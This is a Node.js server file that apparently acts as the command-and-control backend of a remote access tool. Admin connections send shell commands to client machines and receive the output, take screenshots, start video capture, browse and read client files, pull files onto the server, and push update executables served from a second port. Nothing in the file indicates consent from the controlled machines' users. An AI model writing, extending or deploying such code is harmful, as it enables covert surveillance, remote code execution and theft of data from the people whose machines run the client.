// const io = require("socket.io")(7070);
const httpServer = require("http").createServer();
const io = require("socket.io")(httpServer, {
  cors: {
    // origin: "https://example.com",
    origin: "*",
    methods: ["GET", "POST"],
    credential: true,
  },
});
const ss = require("socket.io-stream");
const fs = require("fs");

class myUtils {
  static clientArr = [];
  static IdIndex(id) {
    for (let i = 0; i < this.clientArr.length; i++) {
      if (this.clientArr[i].id === id) {
        return i;
      }
    }
    return -1;
  }
  static getClientById(id) {
    for (const client of window.clientArr) {
      if (client["id"] == id) {
        return client;
      }
    }
    return false;
  }
  static getClientArr(id) {}
}

var cmdResult = {
  data: "",
};

io.on("connection", (sk) => {
  sk.on("message", (data) => {
    if (data.admin === true) {
      console.log("i a admin");
      sk.join("admin");
    } else {
      console.log("i not admin");
      sk.join("client");
    }
    console.log(data);
  });
  sk.on("init", (information) => {
    let obj = {
      id: sk.id,
      streaming: false,
      ...information,
    };
    // console.log(obj);
    myUtils.clientArr.push(obj);
  });

  sk.on("updateinfo", (newInfo) => {
    for (const obj of myUtils.clientArr) {
      if (obj["id"] == sk.id) {
        for (const objKey in obj) {
          for (const key in newInfo) {
            if (Object.hasOwnProperty.call(obj, key)) {
              obj[key] = newInfo[key];
            }
          }
        }
      }
    }
  });

  sk.on("dialog", (dialogContent) => {
    sk.to("admin").emit("apidialog", dialogContent);
  });

  sk.on("cmdresult", (result) => {
    cmdResult.data = result;
    console.log(result);
    sk.to("admin").emit("apisendcmd", cmdResult);
  });
  sk.on("disconnect", (reason) => {
    console.log(reason);
    cmdResult.data = reason;
    // 删除数组中刚断开连接的元素
    if (myUtils.IdIndex(sk.id) > -1) {
      myUtils.clientArr.splice(myUtils.IdIndex(sk.id), 1);
    }
  });

  sk.on("screenshot", (imgBuffer) => {
    sk.to("admin").emit("apigetscreenshot", imgBuffer);
  });

  sk.on("debug", (msg) => {
    sk.to("admin").emit("debug", msg);
  });

  ss(sk).on("downloadfile", (stream, fileName) => {
    // ss(sk).to("admin").emit("apidownloadfile", stream);
    // console.log(777);
    // console.log(stream);
    // if (!fs.existsSync("tmpDir")) {
    //   fs.mkdirSync("tmpDir");
    // }
    if (!fs.existsSync("/var/www/tmpDir/tmpDir")) {
      fs.mkdirSync("/var/www/tmpDir/tmpDir", {recursive: true});
    }
    const to = fs.createWriteStream(`/var/www/tmpDir/tmpDir/${fileName}`);
    to.on("finish", () => {
      sk.to("admin").emit("apidownloadfile", fileName);
    });
    stream.pipe(to);
    // let stream2 = ss.createStream();
    // ss(sk).to("admin").emit("apidownloadfile", stream2);
    // stream.pipe(stream2);
  });

  sk.on("listdir", (result, url) => {
    sk.to("admin").emit("apilistdir", result, url);
  });

  sk.on("showfilecontent", (result, url) => {
    sk.to("admin").emit("apishowfilecontent", result, url);
  });

  sk.emit("message", "hello from ser");
});

//admin段api
io.on("connection", (sk) => {
  sk.on("apidialog", (id) => {
    sk.to(id).emit("dialog");
  });
  sk.on("apigetallclients", () => {
    // console.log(clientArr)
    sk.emit("apigetallclients", myUtils.clientArr);
  });

  sk.on("apisendcmd", (id, cmd) => {
    console.log(id, cmd);
    sk.to(id).emit("exec", cmd);
  });

  sk.on("apiupdateallclients", (update_name) => {
    sk.to("client").emit("version_update", update_name);
  });

  sk.on("apiupdatethisclient", (id, update_name) => {
    sk.to(id).emit("version_update", update_name);
  });

  sk.on("apiupdatethisclientcore", (id, update_name) => {
    sk.to(id).emit("version_update", update_name);
  });

  sk.on("apiupdatethisclientutils", (id, update_name) => {
    sk.to(id).emit("utils_update", update_name);
  });

  sk.on("apireload", () => {
    sk.to(sk.id).emit("reload");
  });

  sk.on("apigetscreenshot", (id) => {
    sk.to(id).emit("screenshot");
  });

  //FileExplorer
  sk.on("apilistdir", (id, dir) => {
    sk.to(id).emit("listdir", dir);
  });

  sk.on("apishowfilecontent", (id, fileName) => {
    sk.to(id).emit("showfilecontent", fileName);
  });

  sk.on("apidownloadfile", (id, fileName) => {
    // ss(sk).to(id).emit("downloadfile", fileName);
    console.log(fileName);
    sk.to(id).emit("downloadfile", fileName);
  });

  sk.on("apistartvideocapture", (id) => {
    sk.to(id).emit("startvideocapture");
    myUtils.clientArr[myUtils.IdIndex(id)].streaming = true;
  });

  sk.on("apistopvideocapture", (id) => {
    sk.to(id).emit("stopvideocapture");
    myUtils.clientArr[myUtils.IdIndex(id)].streaming = false;
  });
});

const koa = require("koa");
// const fs = require("fs");
let app = new koa();

app.use(async (ctx) => {
  let url = ctx.request.url;

  if (url === "/backend.exe") {
    console.log(url);
    ctx.body = fs.readFileSync("../client/backend.exe");
    // ctx.body = "hello";
  }
  if (url === "/hash.txt") {
    console.log(url);
    ctx.body = fs.readFileSync("../client/hash.txt");
  }
  if (url === "/pack.zip") {
    console.log(url);
    ctx.body = fs.readFileSync("../client/pack.zip");
  }
  if (url === "/backend.zip") {
    console.log(url);
    ctx.body = fs.readFileSync("../client/backend.zip");
  }
});

httpServer.listen(7070);

app.listen(7071);

module.exports = {
  io: io,
  myUtils: myUtils,
};
